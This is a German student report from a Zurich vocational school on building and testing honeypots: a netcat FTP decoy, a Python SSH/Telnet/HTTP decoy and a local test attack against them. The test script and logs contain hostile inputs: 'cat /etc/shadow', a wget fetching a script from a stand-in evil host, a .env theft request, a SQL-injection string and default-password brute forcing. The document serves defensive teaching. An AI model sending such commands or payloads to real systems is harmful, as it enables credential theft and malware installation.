# Dokumentation Arbeitsauftrag Honeypots

**Name:** Rewan Ezzeldin
**Schule:** TBZ – Technische Berufsschule Zürich
**Lehrberuf:** Informatiker EFZ Plattformentwicklung, 4. Lehrjahr
**Kompetenz:** B1I · **Bloom:** Anwenden
**Datum:** 20.09.2026

---

## Inhaltsverzeichnis

1. Ziel
2. Wahl der Honeypots
3. Recherche: Installation von Cowrie
4. Installation meiner Honeypots
5. Test: Angriff auf die Honeypots
6. Auswertung der Logs
7. Erkenntnisse
8. Einsatz im Alltag
9. Reflexion
10. Anhang: Dateien

---

## 1. Ziel

Mein Ziel war es, erste praktische Erfahrungen mit Honeypots zu sammeln. Ich wollte verstehen, wie man einen Honeypot installiert, wie er Angriffe protokolliert und wo der Einsatz im Alltag sinnvoll ist.

---

## 2. Wahl der Honeypots

Zuerst habe ich mich für **Cowrie** entschieden, weil er in der Liste der Lehrperson steht und der bekannteste Open-Source-Honeypot für SSH und Telnet ist.

Meine Testumgebung (Ubuntu 24, Python 3.12) hatte jedoch **keinen Internetzugang**. Deshalb konnte ich Cowrie weder per `git clone` noch per `pip` oder Docker herunterladen. Das habe ich so überprüft:

```bash
$ pip download cowrie -d /tmp/x
ERROR: Could not find a version that satisfies the requirement cowrie (from versions: none)
```

Ausserdem habe ich geprüft, welche Werkzeuge vorhanden sind:

| Werkzeug | Vorhanden |
|---|---|
| Python 3.12.3 | Ja |
| netcat (`nc`) | Ja |
| git | Ja |
| docker, nmap, ssh, telnet | Nein |
| Python-Pakete twisted, paramiko | Nein |

Darum habe ich mich für zwei Honeypots entschieden, die ohne Internet funktionieren:

1. **Netcat/Bash-Honeypot** – steht ebenfalls in der Liste der Lehrperson. Er gibt sich als FTP-Server aus.
2. **Eigener Python-Honeypot** – ein Low-Interaction-Honeypot, den ich nach dem Vorbild von Cowrie gebaut habe. Er simuliert drei Dienste (SSH, Telnet, HTTP) und protokolliert alles im JSON-Format.

---

## 3. Recherche: Installation von Cowrie

Auch wenn ich Cowrie nicht installieren konnte, habe ich recherchiert, wie die Installation funktioniert.

**Was ist Cowrie?**
Cowrie ist ein Medium- bis High-Interaction-Honeypot für SSH und Telnet. Er zeichnet Brute-Force-Angriffe und alle Befehle auf, die ein Angreifer in der Shell eingibt. Im Shell-Modus emuliert er ein UNIX-System mit einem gefälschten Dateisystem. Dateien, die ein Angreifer mit `wget` oder `curl` herunterlädt, werden zur späteren Analyse gespeichert.

**Installationsmöglichkeiten:** git clone, Docker oder pip. Docker ist am einfachsten zum Ausprobieren.

**Variante A – Docker (schnell):**

```bash
docker run -p 2222:2222 cowrie/cowrie:latest
ssh -p 2222 root@localhost
```

**Variante B – klassische Installation:**

```bash
# 1. Abhängigkeiten installieren
sudo apt update
sudo apt-get install git python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind virtualenv

# 2. Eigenen Benutzer ohne Passwort anlegen (Sicherheit!)
sudo adduser --disabled-password cowrie
su - cowrie

# 3. Cowrie herunterladen
git clone https://github.com/cowrie/cowrie
cd cowrie

# 4. Virtuelle Python-Umgebung erstellen
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install --upgrade -r requirements.txt

# 5. Konfiguration (z.B. Telnet aktivieren)
cp etc/cowrie.cfg.dist etc/cowrie.cfg
#   -> in cowrie.cfg unter [telnet]: enabled = true

# 6. Port 22 auf 2222 umleiten (echter SSH-Dienst vorher auf anderen Port verschieben)
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# 7. Starten und Logs live anschauen
bin/cowrie start
tail -f var/log/cowrie/cowrie.log
```

**Wichtige Dateien von Cowrie:**

| Datei | Zweck |
|---|---|
| `etc/cowrie.cfg` | Eigene Konfiguration |
| `etc/userdb.txt` | Welche Logins akzeptiert werden |
| `honeyfs/` | Inhalte des gefälschten Dateisystems |
| `var/log/cowrie/cowrie.json` | Protokoll im JSON-Format |

---

## 4. Installation meiner Honeypots

### 4.1 Netcat/Bash-Honeypot

Ich habe ein Bash-Skript geschrieben, das in einer Endlosschleife auf Port 2121 lauscht. Jeder Besucher bekommt einen gefälschten Banner eines alten FTP-Servers. Alles, was der Angreifer sendet, schreibe ich mit Zeitstempel in eine Logdatei.

**Datei `nc_honeypot.sh`:**

```bash
#!/bin/bash
# Netcat/Bash-Honeypot: gibt sich als FTP-Server aus und loggt alles
PORT=${1:-2121}; LOG=nc_honeypot.log
echo "[*] NC-Honeypot lauscht auf Port $PORT" >&2
while true; do
  { echo "220 ProFTPD 1.3.3c Server (Firmen-FTP) ready."; sleep 3; } \
  | nc -l -p $PORT -q 1 2>/dev/null \
  | while IFS= read -r line; do echo "$(date '+%F %T') | $line" >> $LOG; done
  echo "$(date '+%F %T') | --- Verbindung beendet ---" >> $LOG
done
```

**Installation und Start:**

```bash
mkdir -p /home/claude/honeypot && cd /home/claude/honeypot
chmod +x nc_honeypot.sh
nohup ./nc_honeypot.sh 2121 >/dev/null 2>&1 &
```

Ich habe bewusst ProFTPD 1.3.3c als Banner gewählt, weil diese Version bekannte Sicherheitslücken hat und für Angreifer attraktiv wirkt.

### 4.2 Python-Honeypot (SSH, Telnet, HTTP)

Da der Netcat-Honeypot keine IP-Adressen protokolliert und nur eine Verbindung gleichzeitig annehmen kann, habe ich einen besseren Honeypot in Python gebaut. Ich habe dafür nur die Standardbibliothek (`asyncio`, `json`) verwendet, damit keine Installation aus dem Internet nötig ist.

**Die drei simulierten Dienste:**

| Port | Dienst | Tarnung | Was protokolliert wird |
|---|---|---|---|
| 2222 | SSH | OpenSSH 7.2p2 (Ubuntu 16.04) | Verbindung, SSH-Client-Software des Angreifers |
| 2323 | Telnet | Server «srv-db01», Ubuntu 16.04 | Benutzernamen, Passwörter, eingegebene Befehle |
| 8080 | HTTP | Router-Admin-Seite, Apache 2.2.15 | Aufgerufene URL, User-Agent, Formulardaten |

**Besonderheit beim Telnet-Dienst:** Die ersten zwei Login-Versuche lasse ich absichtlich scheitern. Beim dritten Versuch «darf» der Angreifer rein und landet in einer Fake-Root-Shell. So kann ich beobachten, was er nach dem Login macht.

**Datei `pyhoneypot.py`:**

```python
#!/usr/bin/env python3
"""Low-Interaction-Honeypot: SSH (2222), Telnet (2323), HTTP (8080). Loggt alles als JSON."""
import asyncio, json, datetime

LOGFILE = "honeypot.json"

def log(service, peer, event, **data):
    entry = {"zeit": datetime.datetime.now().isoformat(timespec="seconds"),
             "dienst": service, "quelle_ip": peer[0], "quelle_port": peer[1],
             "ereignis": event, **data}
    with open(LOGFILE, "a") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    print(entry, flush=True)

async def readline(r, timeout=10):
    data = await asyncio.wait_for(r.readline(), timeout)
    return data.decode(errors="replace").strip()

# --- Fake SSH: sendet Banner einer alten, "verwundbaren" OpenSSH-Version ---
async def ssh(r, w):
    peer = w.get_extra_info("peername"); log("ssh", peer, "verbindung")
    w.write(b"SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1\r\n"); await w.drain()
    try:
        client = await readline(r); log("ssh", peer, "client_banner", client=client)
    except Exception: pass
    w.close()

# --- Fake Telnet: Login-Prompt, jedes Passwort "falsch", Shell-Befehle nach 3. Versuch ---
async def telnet(r, w):
    peer = w.get_extra_info("peername"); log("telnet", peer, "verbindung")
    try:
        for versuch in range(1, 4):
            w.write(b"srv-db01 login: "); await w.drain(); user = await readline(r)
            w.write(b"Password: "); await w.drain(); pw = await readline(r)
            log("telnet", peer, "login_versuch", user=user, passwort=pw, versuch=versuch)
            if versuch < 3:
                w.write(b"\r\nLogin incorrect\r\n")
        # Nach 3 Versuchen "reinlassen", um Befehle zu beobachten
        w.write(b"\r\nWelcome to Ubuntu 16.04.7 LTS\r\nroot@srv-db01:~# "); await w.drain()
        while True:
            cmd = await readline(r, timeout=30)
            if not cmd: break
            log("telnet", peer, "befehl", befehl=cmd)
            if cmd in ("exit", "logout"): break
            antwort = {"whoami": "root", "id": "uid=0(root) gid=0(root) groups=0(root)",
                       "uname -a": "Linux srv-db01 4.4.0-210-generic x86_64 GNU/Linux"}.get(cmd, "")
            w.write((antwort + "\r\nroot@srv-db01:~# ").encode()); await w.drain()
    except Exception: pass
    w.close()

# --- Fake HTTP: Admin-Login-Seite, loggt Pfade, User-Agents und Formulardaten ---
async def http(r, w):
    peer = w.get_extra_info("peername")
    try:
        raw = await asyncio.wait_for(r.read(4096), 10)
        text = raw.decode(errors="replace"); first = text.split("\r\n")[0]
        ua = next((l[12:] for l in text.split("\r\n") if l.lower().startswith("user-agent:")), "")
        body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
        log("http", peer, "anfrage", request=first, user_agent=ua, body=body)
        html = b"<html><h1>Router Admin</h1><form method=post>User <input name=u> Pass <input name=p type=password><button>Login</button></form></html>"
        w.write(b"HTTP/1.1 200 OK\r\nServer: Apache/2.2.15 (CentOS)\r\nContent-Type: text/html\r\nContent-Length: "
                + str(len(html)).encode() + b"\r\n\r\n" + html)
        await w.drain()
    except Exception: pass
    w.close()

async def main():
    for handler, port in ((ssh, 2222), (telnet, 2323), (http, 8080)):
        await asyncio.start_server(handler, "0.0.0.0", port)
        print(f"[*] {handler.__name__} lauscht auf Port {port}", flush=True)
    await asyncio.Event().wait()

asyncio.run(main())
```

**Start:**

```bash
cd /home/claude/honeypot
nohup python3 pyhoneypot.py > hp_console.log 2>&1 &
```

**Ausgabe beim Start:**

```
[*] ssh lauscht auf Port 2222
[*] telnet lauscht auf Port 2323
[*] http lauscht auf Port 8080
```

### 4.3 Problem während der Installation

Beim ersten Start habe ich die Skripte mit `~/honeypot` angesprochen. In meiner Umgebung zeigt `~` aber auf `/root` und nicht auf `/home/claude`. Deshalb wurde der Honeypot nicht gestartet und mein Angriff ergab `Connection refused`. Ich habe den Fehler behoben, indem ich den vollständigen Pfad `/home/claude/honeypot` verwendet habe. Danach lief alles.

**Lehre daraus:** Bei `Connection refused` zuerst prüfen, ob der Dienst überhaupt läuft, zum Beispiel mit `ps aux | grep honeypot` oder `ss -tlnp`.

---

## 5. Test: Angriff auf die Honeypots

### 5.1 Angriff auf den Netcat-Honeypot

Ich habe mich mit `nc` verbunden und einen FTP-Login versucht:

```bash
printf 'USER admin\r\nPASS admin123\r\nLIST\r\n' | nc -q 2 127.0.0.1 2121
```

**Antwort des Honeypots:**

```
220 ProFTPD 1.3.3c Server (Firmen-FTP) ready.
```

**Protokoll `nc_honeypot.log`:**

```
2026-09-20 12:09:57 | USER admin
2026-09-20 12:09:57 | PASS admin123
2026-09-20 12:09:57 | LIST
2026-09-20 12:09:59 | --- Verbindung beendet ---
```

Der Honeypot hat Benutzername und Passwort erfasst. Die IP-Adresse des Angreifers fehlt jedoch.

### 5.2 Angriff auf den Python-Honeypot

Für den Test habe ich ein eigenes Angriffsskript `angriff.py` geschrieben. Es simuliert vier typische Angriffe:

1. **Portscan** – welche Ports sind offen?
2. **Banner-Grabbing** – welche SSH-Version läuft?
3. **Telnet-Brute-Force** – Standardpasswörter ausprobieren und nach dem Login Befehle ausführen
4. **Web-Angriffe** – Admin-Seite suchen, `.env`-Datei stehlen, SQL-Injection, Login-Brute-Force

**Datei `angriff.py`:**

```python
import socket, time
H="127.0.0.1"
def sock(p):
    s=socket.create_connection((H,p),timeout=3); return s
print("### 1) Portscan")
for p in [21,22,23,80,443,2121,2222,2323,3306,8080]:
    try: sock(p).close(); print(f"  Port {p}: OFFEN")
    except: pass
print("### 2) Banner-Grabbing SSH")
s=sock(2222); print("  ",s.recv(100).decode().strip()); s.send(b"SSH-2.0-libssh_0.9.6\r\n"); s.close()
print("### 3) Telnet-Brute-Force + Befehle")
s=sock(2323)
for u,pw in [("root","root"),("admin","admin"),("root","123456")]:
    time.sleep(.2); s.recv(200); s.send(f"{u}\n".encode()); time.sleep(.2); s.recv(200); s.send(f"{pw}\n".encode())
time.sleep(.3); print("  ",s.recv(300).decode().strip().splitlines()[-2:])
for c in ["whoami","uname -a","cat /etc/shadow","wget http://evil.example/bot.sh","exit"]:
    s.send(f"{c}\n".encode()); time.sleep(.2); s.recv(300)
s.close()
print("### 4) Web-Angriffe")
for req in ["GET /admin HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n",
            "GET /.env HTTP/1.1\r\nUser-Agent: Mozilla/5.0 zgrab\r\n\r\n",
            "GET /index.php?id=1'+OR+'1'='1 HTTP/1.1\r\nUser-Agent: curl/8.5\r\n\r\n",
            "POST /login HTTP/1.1\r\nUser-Agent: Hydra\r\n\r\nu=admin&p=password"]:
    s=sock(8080); s.send(req.encode()); print("  ",s.recv(60).decode().splitlines()[0], "<-", req.split("\r\n")[0]); s.close()
```

**Ausgabe des Angriffs (Sicht des Angreifers):**

```
### 1) Portscan
  Port 2121: OFFEN
  Port 2222: OFFEN
  Port 2323: OFFEN
  Port 8080: OFFEN
### 2) Banner-Grabbing SSH
   SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1
### 3) Telnet-Brute-Force + Befehle
   ['Welcome to Ubuntu 16.04.7 LTS', 'root@srv-db01:~#']
### 4) Web-Angriffe
   HTTP/1.1 200 OK <- GET /admin HTTP/1.1
   HTTP/1.1 200 OK <- GET /.env HTTP/1.1
   HTTP/1.1 200 OK <- GET /index.php?id=1'+OR+'1'='1 HTTP/1.1
   HTTP/1.1 200 OK <- POST /login HTTP/1.1
```

Aus Sicht des Angreifers sieht alles echt aus: Er findet offene Ports, eine alte SSH-Version und kommt scheinbar als `root` auf einen Datenbankserver.

---

## 6. Auswertung der Logs

### 6.1 Protokoll `honeypot.json` (Auszug)

```json
{"zeit": "2026-09-20T12:10:36", "dienst": "ssh", "quelle_ip": "127.0.0.1", "quelle_port": 50758, "ereignis": "client_banner", "client": "SSH-2.0-libssh_0.9.6"}
{"zeit": "2026-09-20T12:10:37", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "login_versuch", "user": "root", "passwort": "root", "versuch": 1}
{"zeit": "2026-09-20T12:10:37", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "login_versuch", "user": "admin", "passwort": "admin", "versuch": 2}
{"zeit": "2026-09-20T12:10:38", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "login_versuch", "user": "root", "passwort": "123456", "versuch": 3}
{"zeit": "2026-09-20T12:10:38", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "befehl", "befehl": "whoami"}
{"zeit": "2026-09-20T12:10:38", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "befehl", "befehl": "uname -a"}
{"zeit": "2026-09-20T12:10:38", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "befehl", "befehl": "cat /etc/shadow"}
{"zeit": "2026-09-20T12:10:38", "dienst": "telnet", "quelle_ip": "127.0.0.1", "quelle_port": 58722, "ereignis": "befehl", "befehl": "wget http://evil.example/bot.sh"}
{"zeit": "2026-09-20T12:10:39", "dienst": "http", "quelle_ip": "127.0.0.1", "quelle_port": 46420, "ereignis": "anfrage", "request": "GET /admin HTTP/1.1", "user_agent": "sqlmap/1.7", "body": ""}
{"zeit": "2026-09-20T12:10:39", "dienst": "http", "quelle_ip": "127.0.0.1", "quelle_port": 46422, "ereignis": "anfrage", "request": "GET /.env HTTP/1.1", "user_agent": "Mozilla/5.0 zgrab", "body": ""}
{"zeit": "2026-09-20T12:10:39", "dienst": "http", "quelle_ip": "127.0.0.1", "quelle_port": 46432, "ereignis": "anfrage", "request": "GET /index.php?id=1'+OR+'1'='1 HTTP/1.1", "user_agent": "curl/8.5", "body": ""}
{"zeit": "2026-09-20T12:10:39", "dienst": "http", "quelle_ip": "127.0.0.1", "quelle_port": 46440, "ereignis": "anfrage", "request": "POST /login HTTP/1.1", "user_agent": "Hydra", "body": "u=admin&p=password"}
```

Das vollständige Log mit allen 19 Einträgen liegt als Datei `honeypot.json` bei.

### 6.2 Zusammenfassung

Ich habe das Log mit einem kurzen Python-Befehl ausgewertet:

```
Ereignisse total: 19
Pro Dienst: {'ssh': 4, 'telnet': 10, 'http': 5}
Passwörter: [('root', 'root'), ('admin', 'admin'), ('root', '123456')]
Angreifer-Tools (User-Agent): ['sqlmap/1.7', 'Mozilla/5.0 zgrab', 'curl/8.5', 'Hydra']
```

### 6.3 Was der Honeypot pro Angriff erkannt hat

| Angriff | Was ich im Log sehe | Bedeutung |
|---|---|---|
| Portscan | Leere Verbindungen auf SSH, Telnet und HTTP | Schon das Auskundschaften fällt auf |
| Banner-Grabbing | Client-Software `libssh_0.9.6` | Hinweis auf ein automatisiertes Tool, nicht auf einen Menschen |
| Telnet-Brute-Force | Alle Passwörter im Klartext | Angreifer probieren Standardpasswörter |
| Befehle nach Login | `whoami`, `uname -a` | Angreifer prüft zuerst Rechte und System |
| | `cat /etc/shadow` | Versuch, Passwort-Hashes zu stehlen |
| | `wget .../bot.sh` | Versuch, Malware (z.B. Botnet) nachzuladen |
| Web: `/admin` | User-Agent `sqlmap` | Suche nach Admin-Oberfläche mit Angriffstool |
| Web: `/.env` | User-Agent `zgrab` | Versuch, Konfigurationsdatei mit Zugangsdaten zu stehlen |
| Web: `id=1' OR '1'='1` | SQL-Injection in der URL | Versuch, die Datenbank zu manipulieren |
| Web: `POST /login` | User-Agent `Hydra`, Daten `admin/password` | Brute-Force auf das Web-Login |

---

## 7. Erkenntnisse

1. **Jeder Zugriff auf einen Honeypot ist verdächtig.** Auf einem Honeypot läuft kein echter Dienst, den jemand legitim braucht. Deshalb gibt es praktisch keine Fehlalarme. Auf einem echten Webserver dagegen sind die meisten Zugriffe normale Besucher, und man muss Angriffe mühsam herausfiltern.

2. **Ich lerne die Vorgehensweise von Angreifern kennen.** Das Muster war immer ähnlich: zuerst scannen, dann Version herausfinden, dann mit Standardpasswörtern einloggen, dann Rechte prüfen und schliesslich Daten stehlen oder Malware nachladen.

3. **Standardpasswörter sind ein grosses Risiko.** Die Brute-Force-Angriffe verwenden Passwörter wie `root`, `admin` oder `123456`. Wer diese nicht ändert, ist sofort angreifbar.

4. **Der User-Agent verrät oft das Tool.** Viele Angriffstools wie sqlmap oder Hydra geben sich im User-Agent zu erkennen. Profis fälschen ihn allerdings.

5. **Unterschied Low- und High-Interaction:**

| | Netcat-Honeypot | Mein Python-Honeypot | Cowrie |
|---|---|---|---|
| Interaktion | Sehr tief | Tief | Mittel bis hoch |
| IP-Adresse geloggt | Nein | Ja | Ja |
| Mehrere Verbindungen gleichzeitig | Nein | Ja | Ja |
| Fake-Shell | Nein | Nur wenige Befehle | Ja, mit Fake-Dateisystem |
| Downloads speichern | Nein | Nein | Ja |
| Glaubwürdigkeit für Profis | Tief | Tief | Hoch |

Ein erfahrener Angreifer würde bei meinem Python-Honeypot schnell merken, dass die Shell nicht echt ist, weil zum Beispiel `ls` oder `cat /etc/shadow` nichts zurückgeben. Cowrie ist hier deutlich besser.

---

## 8. Einsatz im Alltag

Ich sehe folgende sinnvolle Einsatzmöglichkeiten:

- **Frühwarnsystem im internen Firmennetz:** Ein Fake-Server wie «srv-db01» im internen Netz. Wenn jemand darauf zugreift, ist das ein starker Hinweis, dass ein Angreifer bereits im Netz ist oder ein Gerät kompromittiert wurde.
- **Forschung und Threat Intelligence:** Ein Honeypot im Internet sammelt Informationen über aktuelle Angriffe, Passwortlisten und Malware.
- **Ablenkung:** Angreifer verschwenden Zeit mit dem Honeypot statt mit den echten Systemen.
- **Schulung:** Wie in diesem Auftrag, um Angriffe sicher zu beobachten.

**Wichtig zur Sicherheit:** Einen Honeypot darf man nie auf einem produktiven System betreiben. Er muss isoliert sein, zum Beispiel in einer eigenen VM oder in einem eigenen VLAN. Sonst kann er selbst zum Einstiegspunkt für Angreifer werden.

---

## 9. Reflexion

Der Auftrag hat mir gezeigt, dass ein Honeypot technisch nicht kompliziert sein muss. Schon ein einfaches Skript mit Netcat erfasst Passwörter. Mit wenig mehr Aufwand (Python) konnte ich IP-Adressen, Befehle und Angriffstools protokollieren.

Schwierig war, dass ich Cowrie wegen des fehlenden Internetzugangs nicht installieren konnte. Dadurch musste ich auf eine Alternative ausweichen, habe dabei aber besser verstanden, wie ein Honeypot intern funktioniert.

Als nächsten Schritt möchte ich Cowrie auf meinem eigenen Rechner per Docker starten und ihn mit `ssh -p 2222 root@localhost` angreifen, um den Unterschied zu einem High-Interaction-Honeypot selbst zu erleben.

---

## 10. Anhang: Dateien

| Datei | Beschreibung |
|---|---|
| `nc_honeypot.sh` | Netcat/Bash-Honeypot (FTP-Tarnung, Port 2121) |
| `nc_honeypot.log` | Protokoll des Netcat-Honeypots |
| `pyhoneypot.py` | Python-Honeypot (SSH 2222, Telnet 2323, HTTP 8080) |
| `angriff.py` | Mein Angriffsskript für den Test |
| `honeypot.json` | Vollständiges Protokoll des Python-Honeypots (19 Ereignisse) |

**Quellen:**
- Liste Open-Source-Honeypots: https://github.com/paralax/awesome-honeypots
- Cowrie (offizielles Repository): https://github.com/cowrie/cowrie
- Cowrie Installationsanleitung: https://github.com/MikeDawg/cowrie/blob/master/INSTALL.md
- Beispiel-Setup Cowrie: https://github.com/MidnightCyber/Honeypot-project
